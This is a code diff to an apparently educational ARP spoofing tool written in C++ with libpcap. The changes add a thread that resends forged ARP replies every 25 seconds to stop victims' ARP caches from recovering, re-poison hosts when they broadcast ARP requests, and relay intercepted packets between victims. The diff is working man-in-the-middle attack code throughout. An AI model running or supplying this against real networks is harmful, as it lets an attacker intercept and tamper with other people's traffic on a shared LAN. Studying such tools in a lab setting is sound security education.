@@ -106,13 +106,24 @@ void relay(pcap_t* handle, const u_char* packet, int index, int len){
     for(int i = 0; i < 6; i++) sendPacket[i] = targetMACList[index][i];
     for(int i = 6; i < 12; i++) sendPacket[i] = myMAC[i-6];
     for(int i = 12; i < len; i++) sendPacket[i] = packet[i];
-    printf("relayed\n");
+    printf("relayed\n\n");
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(sendPacket), len);
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
     }
     free(sendPacket);
-    printf("\n done\n");
+}
+
+void preventARPRcover(char* interface){
+    char errbuf[PCAP_ERRBUF_SIZE];
+    while(true){
+        sleep(25);
+        printf("##### Send a Packet of ARP for prevent ARP Recovery! #####\n\n");
+        pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
+        for(u_int i = 0; i < senderList.size(); i++)
+            sendARP(handle, senderList[i], targetList[i], senderMACList[i]);
+        pcap_close(handle);
+    }
 }
 
 void relayCheck(const u_char* packet, struct pcap_pkthdr* header, char* interface){
@@ -120,22 +131,31 @@ void relayCheck(const u_char* packet, struct pcap_pkthdr* header, char* interfac
     pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
     ether_header ether = getEther(packet);
     ip_header ip = otherGetIp(packet);
-
     Ip sender = changeIp(ip.sender);
     Ip target = changeIp(ip.target);
-
-    // If the ip is exist in my arp table
+    Ip targetNormal = changeIp(getIp(packet).target);
+    // If the IP is exist in my ARP table
     for(u_int i = 0; i < senderMACList.size(); i++){
         // If target is not my IP
-        if(Mac(ether.src) == senderMACList[i] && target != myIp){
+        if(Mac(ether.src) == senderMACList[i] && targetNormal != myIp){
             // When Destination is my MAC Address
            if(Mac(ether.dest) == Mac(myMAC)){
-               printf("packet size : %d\n", header->len);
-               printf("Find!!! %d.%d.%d.%d -> %d.%d.%d.%d\n", ip.sender[0], ip.sender[1], ip.sender[2], ip.sender[3], ip.target[0], ip.target[1], ip.target[2], ip.target[3]);
-               relay(handle, packet, i, header->caplen);
-               pcap_close(handle);
-               return;
+               if(ether.type[0] == 0x08 && ether.type[1] == 0x06){
+                   sendARP(handle, senderList[i], targetList[i], senderMACList[i]);
+                   return;
+               }else{
+                   printf("packet size : %d\n", header->len);
+                   printf("Find!!! %d.%d.%d.%d -> %d.%d.%d.%d\n", ip.sender[0], ip.sender[1], ip.sender[2], ip.sender[3], ip.target[0], ip.target[1], ip.target[2], ip.target[3]);
+                   relay(handle, packet, i, header->caplen);
+                   pcap_close(handle);
+                   return;
+               }
            }
+        }else if (Mac(ether.src) == senderMACList[i] && Mac(ether.dest) == Mac("ff:ff:ff:ff:ff:ff")){
+            if(target == targetList[i] && ether.type[0] == 0x08 && ether.type[1] == 0x06){
+                sendARP(handle, senderList[i], targetList[i], senderMACList[i]);
+                return;
+            }
         }
     }
 }
@@ -183,11 +203,12 @@ int main(int argc, char* argv[]) {
         senderMACList.push_back(Mac(senderMAC));
         targetMACList.push_back(Mac(targetMAC));
         sendARP(handle, senderList[i], targetList[i], senderMAC);
-        printf(" done %d!\n", i+1);
+        printf(" Complete the %dth task!\n", i+1);
     }
 
-    printf("Finished send ARP packet!\n");
+    printf("Finished send ARP packet!\n\n");
 
+    thread preventARPRecoverThread(preventARPRcover, dev);
     observer(handle, dev);
 
     pcap_close(handle);
